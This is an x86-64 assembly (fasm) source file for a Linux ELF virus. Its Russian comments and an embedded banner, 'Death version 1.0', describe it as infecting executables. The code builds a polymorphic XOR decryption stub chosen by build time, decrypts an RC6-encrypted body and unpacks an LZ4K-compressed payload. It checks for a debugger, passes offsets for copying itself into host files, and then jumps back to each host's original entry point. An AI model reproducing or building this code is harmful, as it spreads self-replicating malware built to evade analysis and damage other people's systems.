; Подключаем определения ассемблера
include 'format/format.inc'

format ELF64 executable ELFOSABI_LINUX;

; Указываем точку входа
entry USER_CODE.start

; Задаём своё пространство, чтобы избежать пересечений с любыми иными
USER_CODE::

; Подключаем свои определения
namespace USER_CODE
include 'utility/align.inc'
include 'utility/@@.inc'
include 'x86/include/macro/struct.inc'
include 'include/macro/instruction.inc'
include 'include/macro/proc64.inc'
include 'include/macro/struct.inc'

include 'include/linux/unistd_64.inc'
include 'include/linux/ptrace.inc'
include 'include/linux/fcntl.inc'
include 'include/linux/mman.inc'
include 'include/linux/elf.inc'

include 'include/main.inc'
include 'include/rc6.inc'

struct lz4k_t
	crc32_zlib						uint32_t ?
	magic							uint32_t ?
	compressed_size					uint64_t ?
	uncompressed_size				uint64_t ?
	block_size						uint32_t ?
	version							uint8_t ?
	mode							uint8_t ?
	reserved						uint8_t 0x2 dup ?
	align lz4k_t.__alignment
ends

LZ4K_MIN_COMPRESS			:= 0x4

LZ4K_MODE_SOLED				:= 0x1
LZ4K_MODE_BLOCK				:= 0x2

enum CODE_EXIT
		item CODE_EXIT_OK
		item CODE_EXIT_PTRACE
end namespace

; Размер несжатых данных
macro offset_M lz4k, xor_start, xor_count
	local			uncompressed_size, count, tempos, start

	count = xor_count
	start = xor_start
	load uncompressed_size qword from lz4k + lz4k_t.uncompressed_size
	while count <> 0x0
		load tempos qword from start
		tempos = tempos xor (__time__ or (__time__ shl 0x20))
		store tempos: qword at start
		count = count - 0x1
		start = start + 0x8
	end while
	rb uncompressed_size
end macro

macro nops? length
	db length dup 90h
end macro

macro print_code_M size
	; local count
	; count = 0x0
	; while count < size
	; 	load x byte from ($$ + count)
	; 	display '0x'
	; 	NumToStrM x, 0x10
	; 	count = count + 0x1
	; 	if count <> size
	; 		display ', '
	; 	end if
	; 	if (count mod 0xA) = 0
	; 		display 0xA
	; 	end if
	; end while
	; display 0xA
end macro

macro polli_block_M full
	local count, ptr, time

	if full = 0x0
		ptr = $
		virtual at 0x0
			table0::
			push		rax
			nop
			push		rsi
			nop
			push		rdi
			lea			rsi, [rip + (XorDateStart - (ptr + $ + 0x7))]
			lea			rdi, [rip + (XorDateEnd - (ptr + $ + 0x7))]
			mov			rax, [rip + (time_stamp - (ptr + $ + 0x7))]
			@@:
			nop
			cmp			rsi, rdi
			je			@f
			nop
			xor			[rsi], rax
			add			rsi, sizeof(time_stamp)
			nop
			jmp			@b
			@@:
			; Воcстановим используемые регистры
			pop			rdi
			nop
			pop			rsi
			nop
			pop			rax
			if SIZE_XOR_CODE <> ($ - $$)
				displayM "Неправильный размер: ", ($ - $$)
				err ' '
			end if
			print_code_M SIZE_XOR_CODE
		end virtual

		virtual at 0x0
			table1::
			push		rcx
			nop
			push		rdx
			nop
			push		rbx
			lea			rdx, [rip + (XorDateStart - (ptr + $ + 0x7))]
			lea			rbx, [rip + (XorDateEnd - (ptr + $ + 0x7))]
			mov			rcx, [rip + (time_stamp - (ptr + $ + 0x7))]
			@@:
			nop
			cmp			rdx, rbx
			je			@f
			nop
			xor			[rdx], rcx
			add			rdx, sizeof(time_stamp)
			nop
			jmp			@b
			@@:
			; Воcстановим используемые регистры
			pop			rbx
			nop
			pop			rdx
			nop
			pop			rcx
			if SIZE_XOR_CODE <> ($ - $$)
				displayM "Неправильный размер: ", ($ - $$)
				err ' '
			end if
			print_code_M SIZE_XOR_CODE
		end virtual

		virtual at 0x0
			table2::
			push		rbp
			push		r8
			push		r9
			lea			r8, [rip + (XorDateStart - (ptr + $ + 0x7))]
			lea			r9, [rip + (XorDateEnd - (ptr + $ + 0x7))]
			mov			rbp, [rip + (time_stamp - (ptr + $ + 0x7))]
			@@:
			nop
			cmp			r8, r9
			je			@f
			nop
			xor			[r8], rbp
			add			r8, sizeof(time_stamp)
			nop
			jmp			@b
			@@:
			; Воcстановим используемые регистры
			pop			r9
			pop			r8
			pop			rbp
			if SIZE_XOR_CODE <> ($ - $$)
				displayM "Неправильный размер: ", ($ - $$)
				err ' '
			end if
			print_code_M SIZE_XOR_CODE
		end virtual

		virtual at 0x0
			table3::
			push		r10
			push		r11
			push		r12
			lea			r11, [rip + (XorDateStart - (ptr + $ + 0x7))]
			lea			r12, [rip + (XorDateEnd - (ptr + $ + 0x7))]
			mov			r10, [rip + (time_stamp - (ptr + $ + 0x7))]
			@@:
			cmp			r11, r12
			je			@f
			xor			[r11], r10
			add			r11, sizeof(time_stamp)
			nop
			jmp			@b
			@@:
			; Воcстановим используемые регистры
			pop			r12
			pop			r11
			pop			r10
			if SIZE_XOR_CODE <> ($ - $$)
				displayM "Неправильный размер: ", ($ - $$)
				err ' '
			end if
			print_code_M SIZE_XOR_CODE
		end virtual
		time = __time__ and SIZE_XOR_CODE_AND
		if time = 0x0
			ptr = table0
		else if time = 0x1
			ptr = table1
		else if time = 0x2
			ptr = table2
		else if time = 0x3
			ptr = table3
		end if
		count = 0x0
		while count < SIZE_XOR_CODE
			load x byte from ptr: count
			db x
			count = count + 0x1
		end while
	else
		ptr = table0
		count = 0x0
		while count < SIZE_XOR_CODE
			load x byte from ptr: count
			db x
			count = count + 0x1
		end while
		ptr = table1
		count = 0x0
		while count < SIZE_XOR_CODE
			load x byte from ptr: count
			db x
			count = count + 0x1
		end while
		ptr = table2
		count = 0x0
		while count < SIZE_XOR_CODE
			load x byte from ptr: count
			db x
			count = count + 0x1
		end while
		ptr = table3
		count = 0x0
		while count < SIZE_XOR_CODE
			load x byte from ptr: count
			db x
			count = count + 0x1
		end while
	end if
end macro

; r9    ; 6th param
; r8    ; 5th param
; r10   ; 4th param - rcx если обычная функция
; rdx   ; 3rd param
; rsi   ; 2nd param
; rdi   ; 1st param
; eax   ; syscall_number (регистры RCX и R11 будут уничтожены)
; syscall
; Указываем сегмент для кода и констант - делаем с разрешением на запись
segment readable executable writeable

namespace USER_CODE
	; time_stamp как унакальное стартовое значение для XOR
	copyStart:
	start:
		; Восстановление после XOR - это необходимо для полного полиморфизма в будущем
		; Сохранение старых регистров, чтобы не испортить память
		polli_block_M 0x0
		jmp @f
		time_stamp uint64_t __time__ or (__time__ shl 0x20)
				uint64_t __time__ or (__time__ shl 0x20)
				uint64_t __time__ or (__time__ shl 0x20)
				uint64_t __time__ or (__time__ shl 0x20)
		@@:
		; Выравнивание для избежания проблем с XOR
		align		sizeof(time_stamp), nops
		XorDateStart:
; Сохраняем все временные регистры, во избежание потери информации, в том числе rbp - для восстановления стека
		push		rax, rcx, rdx, rsi, rdi, r8, r9, r10, r11, rbp; При изменении этой линии изменить вызов main
		; Сохраним указатель на стек
		mov			rbp, rsp
		; Делаем чтобы стек был выравнен на 0x8 и был готов к вызовам функций, а также в функциях было правильное выравнивание на 0x10
		and			rsp, 0xFFFFFFFFFFFFFFF8

		; Иницилизируем ключ
		fastcall	rc6_init, [time_stamp], [S], KEY_LEN
		fastcall	rc6_decrypt, [S], [rc6_start], [rc6_start], ((rc6_end - rc6_start) / ((RC6_W / 0x8) * 4))
		jmp			rc6_start;перепригиваем в уже расшифрованное место

		displayM "rc6_base: ", (start - 0x400000)
		displayM "rc6_key: ", (time_stamp - start)
		displayM "rc6_key_len: ", (KEY_LEN)
		displayM "rc6_start: ", (rc6_start - start)
		displayM "rc6_end: ", (rc6_end - start)

	; void rc6_decrypt(RC6_WORD *S, const RC6_WORD *in, RC6_WORD *out, size_t num_block)
	; rcx = size_t num_block
	; rdx = RC6_WORD *out
	; rsi = const RC6_WORD *in
	; rdi = RC6_WORD *S
	rc6_decrypt:
		push		rbx, r12, r13, r14
		;rsi = in
		;rdi = S
		;r8 = out
		;r9 = num_block
		mov			r9, rcx
		mov			r8, rdx
		.loop:
		test		r9, r9
		jz			.finish
		; r11 = a
		; r12 = b
		; r13 = c
		; r14 = d
		; Обнулим сначало, что бы можно было копировать в другие регистры и сохранить совместимость для разных размеров слов
		xor			eax, eax
		xor			edx, edx
		xor			ecx, ecx
		xor			ebx, ebx
		mov			RC6_WORD_RAX, [rsi + (0x0) * RC6_WORD_SIZE]
		mov			RC6_WORD_RDX, RC6_WORD[rsi + (0x1) * RC6_WORD_SIZE]
		mov			RC6_WORD_RCX, [rsi + (0x2) * RC6_WORD_SIZE]
		mov			RC6_WORD_RBX, RC6_WORD[rsi + (0x3) * RC6_WORD_SIZE]
		sub			RC6_WORD_RAX, [rdi + (2 * RC6_R + 2) * RC6_WORD_SIZE]
		sub			RC6_WORD_RCX, [rdi + (2 * RC6_R + 3) * RC6_WORD_SIZE]
		mov			r11, rax
		mov			r12, rdx
		mov			r13, rcx
		mov			r14, rbx
		;r10 = i
		mov			r10, (2 * RC6_R)
		.loop_block:
			;Перемешываем a, b, c, d
			mov			rax, r14
			mov			r14, r13
			mov			r13, r12
			mov			r12, r11
			mov			r11, rax
			;RC6_WORD_RAX = t
			;RC6_WORD_RCX = u
			mov			rax, r14
			mov			rcx, r12
			lea			RC6_WORD_RDX, [RC6_WORD_RAX * 2 + 1]
			lea			RC6_WORD_RBX, [RC6_WORD_RCX * 2 + 1]
			mul			RC6_WORD_RDX
			xchg		rax, rcx
			mul			RC6_WORD_RBX
			rol			RC6_WORD_RCX, RC6_LG
			rol			RC6_WORD_RAX, RC6_LG
			; Получим 'c' и 'a'
			mov			rbx, r11
			mov			rdx, r13
			sub			RC6_WORD_RBX, [rdi + r10 * RC6_WORD_SIZE]
			sub			RC6_WORD_RDX, [rdi + r10 * RC6_WORD_SIZE + 0x1 *RC6_WORD_SIZE]
			ror			RC6_WORD_RBX, cl
			xchg		rax, rcx
			ror			RC6_WORD_RDX, cl
			xor			RC6_WORD_RBX, RC6_WORD_RCX
			xor			RC6_WORD_RDX, RC6_WORD_RAX
			mov			r11, rbx
			mov			r13, rdx
			sub			r10, 2
			ja			.loop_block
		; Сохраним расшифрованные данные
		mov			rax, r11
		mov			rcx, r12
		mov			rdx, r13
		mov			rbx, r14
		sub			RC6_WORD_RCX, [rdi]
		sub			RC6_WORD_RBX, [rdi + 0x1 * RC6_WORD_SIZE]
		mov			[r8 + 0x0 * RC6_WORD_SIZE], RC6_WORD_RAX
		mov			[r8 + 0x1 * RC6_WORD_SIZE], RC6_WORD_RCX
		mov			[r8 + 0x2 * RC6_WORD_SIZE], RC6_WORD_RDX
		mov			[r8 + 0x3 * RC6_WORD_SIZE], RC6_WORD_RBX
		add			rsi, RC6_WORD_SIZE * 0x4
		add			r8, RC6_WORD_SIZE * 0x4
		dec			r9
		jmp			.loop
		.finish:
		pop			rbx, r12, r13, r14
		ret

	; void rc6_init(const void *key, RC6_WORD *S, size_t len)
	; rdx = size_t len
	; rsi = RC6_WORD *S
	; rdi = const void *key
	rc6_init:
		push		rbx, rbp, r12, r13
		mov			eax, RC6_KEY_MAX
		; Выделяем стек для L
		sub			rsp, RC6_PRE_PROC + RC6_KEY_MAX
		; Провераем длинну ключа
		cmp			rdx, rax
		cmova		edx,eax
		; Сохраняем параметры
		;r8 = S
		;r9 = L
		mov			r8, rsi
		lea			r9, [rsp + RC6_PRE_PROC]
		; Копируем ключ в L
		mov			rsi, rdi
		mov			ecx, edx
		mov			rdi, r9
		cld
		rep			movsb
		;Забиваем остальное нулями что не хватает
		mov			rcx, RC6_KEY_MAX
		xor			al,al
		sub			ecx, edx
		lea			rdi,[r9 + rdx]
		cld
		rep			stosb
		; ЗАбиваем S 
		mov			RC6_WORD[r8], RC6_P
		xor			ecx, ecx
		.LoopS:
		mov			RC6_WORD_RAX, [r8 + rcx * (RC6_W / 0x8)]
		add			RC6_WORD_RAX, RC6_Q
		mov			[r8 + rcx * (RC6_W / 0x8) + 1 * (RC6_W / 0x8)], RC6_WORD_RAX
		inc			ecx
		cmp			ecx, ((RC6_T - 1) - 1)
		ja			.LoopSNext
		jmp			.LoopS
		.LoopSNext:
		; Получим число с
		test		edx, edx
		jnz			.AlingC
		inc			edx
		.AlingCNext:
		; r13 = c
		mov			r13, rdx
		;edi = n
		;esi = k
		mov			eax, RC6_T
		xor			esi, esi
		cmp			edx, eax
		cmovb		edx, eax
		mov			eax, 3
		mul			edx
		mov			edi, eax
		;r10 = j
		;r11 = i
		xor			r10, r10
		xor			r11, r11
		;rbp = x
		;r12 = y
		xor			rbp, rbp
		xor			r12, r12
		;r8 = S
		;r9 = L
		.loop:
		mov			rax, rbp
		mov			rdx, r12
		lea			RC6_WORD_RCX, [RC6_WORD_RAX + RC6_WORD_RDX]
		mov			RC6_WORD_RAX, [r8 + r11 * (RC6_W / 0x8)]
		mov			RC6_WORD_RBX, [r9 + r10 * (RC6_W / 0x8)]
		add			RC6_WORD_RAX, RC6_WORD_RCX
		rol			RC6_WORD_RAX, 0x3
		lea			RC6_WORD_RCX, [RC6_WORD_RAX + RC6_WORD_RDX]
		add			RC6_WORD_RBX, RC6_WORD_RCX
		rol			RC6_WORD_RBX, cl
		mov			rbp, rax
		mov			r12, rbx
		mov			[r8 + r11 * (RC6_W / 0x8)], RC6_WORD_RAX
		mov			[r9 + r10 * (RC6_W / 0x8)], RC6_WORD_RBX
		mov			ecx, RC6_T
		xor			edx, edx
		lea			rax, [r11 + 1]
		div			ecx
		mov			r11, rdx
		xor			edx, edx
		lea			rax, [r10 + 1]
		div			r13
		inc			esi
		mov			r10, rdx
		cmp			esi, edi
		jb			.loop
		add			rsp, RC6_PRE_PROC + RC6_KEY_MAX
		pop			rbx, rbp, r12, r13
		ret

		.AlingC:
			add			edx, RC6_WORD_SIZE - 1
			and			edx, (0 - RC6_WORD_SIZE)
			shr			edx, RC6_WORD_SHIFT
			jmp			.AlingCNext

	; Выравниваем для удобного XOR
	align sizeof(time_stamp), nops
	align (RC6_W / 0x8 * 0x4), nops
	; Указатель на конец данных XOR
	XorDateEnd:

	rc6_start:
		; В этой функции разожмем - если с нее вернемся, то нужно прыгнуть в функцию чтобы инфицированный файл работал, как и должен
		fastcall	main, [rbp + (0x8 * 0xA)]
		cmp			[adress_jmp], 0x0
		jne			@f
		syscall		__NR_exit, CODE_EXIT_OK
		@@:
		; При усмешном инжекте вывод сообщения
		syscall		__NR_write, STDOUT_FILENO, [msg], (msg.sizeof + msg_add_constant.sizeof + msg_add.sizeof + msg_add_count.sizeof)

		; Считаем куда пригать
		lea			rax, [start]
		add			[adress_jmp], rax

		; Востановим указатель на стек
		mov			rsp, rbp
		; Востановим регестры
		pop			rax, rcx, rdx, rsi, rdi, r8, r9, r10, r11, rbp

		; Прыжок на новую позицию
		jmp			[adress_jmp]
		msg db 'Death version 1.0 (c)oded by <amatilda>-<wstygg> ['
		msg_add_constant db 'xxxxxxxx] ['
		msg_add db 'xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx] ['
		msg_add_count db 'xxxxxxxxxxxxxxxx]',0xA
		adress_jmp uint64_t 0x0
		adress_debug db 0x0; Если не ноль то на отладчик не провераем

		;rdi - arg_list Указатель на на чало аргументов и переменных сред
		proc main uses rbx
			locals
				options options_t
			endl
			mov			[options.arg_list], rdi
			fastcall	lz4k_decompress_soled, [lz4kHeader + sizeof(lz4k_t)], [JmpUncopress], qword[lz4kHeader + lz4k_t.compressed_size]
			lea			rax, [copyStart]
			lea			rcx, [adress_debug]
			lea			rdx, [rc6_init]
			mov			[options.copy_start], rax
			mov			[options.adress_debug], rcx
			mov			[options.rc6_init], rdx
			mov			[options.copy_size], copyEnd - copyStart
			mov			[options.offset_xor_date_code], xor_date_code - copyStart
			mov			[options.offset_xor], XorDateStart - copyStart
			mov			[options.offset_xor_end], XorDateEnd - copyStart
			mov			[options.offset_time_stamp], time_stamp - copyStart
			mov			[options.offset_jmp], adress_jmp - copyStart
			mov			[options.offset_start], start - copyStart
			mov			[options.offset_msg_add], msg_add - copyStart
			mov			[options.offset_msg_add_count], msg_add_count - copyStart
			mov			[options.offset_msg_add_constant], msg_add_constant - copyStart
			mov			[options.offset_rc6_start], rc6_start - copyStart
			mov			[options.rc6_size], ((rc6_end - rc6_start) / ((RC6_W / 0x8) * 4))
			mov			[options.size_rb], JmpUncopressEnd - JmpUncopress
			fastcall	JmpUncopress, [options]
			ret
		endp
		; size_t lz4k_decompress_soled(const void *src, void *dst, size_t len_src)
		; rdx - size_t len_src
		; rsi - void *dst
		; rdi - const void *src
		proc lz4k_decompress_soled
			locals
			endl
			; rdi - src_b
			; r8 - src_e
			; rsi - dst
			; r9 - dst_save
			mov			r9, rsi
			lea			r8, [rdi + rdx]
			.big_loop:
				cmp			rdi, r8
				je			.finish
				; ecx - count
				movzx		ecx, byte[rdi]
				inc			rdi
				mov			eax, ecx
				; eax - count_litter
				shr			eax, 0x4
				lea			r10, [.count_litter_next]
				jmp			.add_litter
			.count_litter_next:
				test		eax, eax
				jz			.count_litter_next_next
				@@:
				mov			dl, [rdi]
				inc			rdi
				mov			[rsi], dl
				inc			rsi
				dec			eax
				jnz			@b
			.count_litter_next_next:
				; ecx - count_match
				and			ecx, 0xF
				jz			.big_loop
				; eax - offset
				mov			al, [rdi]
				mov			ah, [rdi + 0x1]
				add			rdi, 0x2
				lea			r10, [.count_match_next]
				xchg		eax, ecx
				jmp			.add_litter
			.count_match_next:
				; ecx - offset
				; eax - count_match
				mov			r10, rsi
				add			eax, (LZ4K_MIN_COMPRESS - 0x1)
				; r10 - tmp
				sub			r10, rcx
				cmp			ecx, eax
				jb			.dup
					@@:
					mov			dl, [r10]
					inc			r10
					mov			[rsi], dl
					inc			rsi
					dec			eax
					jnz			@b
				jmp			.big_loop
			.dup:
				xor			edx, edx
				div			ecx
				test		eax, eax
				jz			.big_loop
				mov			r11, rcx
				.dup_loop:
					@@:
					mov			dl, [r10]
					inc			r10
					mov			[rsi], dl
					inc			rsi
					dec			ecx
					jnz			@b
				mov			rcx, r11
				dec			eax
				jnz			.dup_loop
				jmp			.big_loop
		.finish:
			sub		rsi, r9
			mov		rax, rsi
			ret

		.add_litter:
			cmp			eax, 0xF
			jne			@f
			.add_litter_loop:
				movzx		edx, byte[rdi]
				inc			rdi
				add			eax, edx
				cmp			dl, 0xFF
				je			.add_litter_loop
			@@:
			jmp			r10
		endp

	; таблица xor для замены рандомнай
	xor_date_code:
	polli_block_M 0x1
	lz4kHeader:
	file '../compress.lz4k'
	align (RC6_W / 0x8 * 0x4), nops
	rc6_end:
	align 0x10
	copyEnd:
	if RC6_W = 0x10
		S dw RC6_T dup (?)
	else if RC6_W = 0x20
		S dd RC6_T dup (?)
	else if RC6_W = 0x40
		S dq RC6_T dup (?)
	else
		err 'RC6_W'
	end if
	; Указатель на вызов разжатой функции
	JmpUncopress:
	offset_M lz4kHeader, XorDateStart, ((XorDateEnd - XorDateStart) / sizeof(time_stamp))
	JmpUncopressEnd:
end namespace
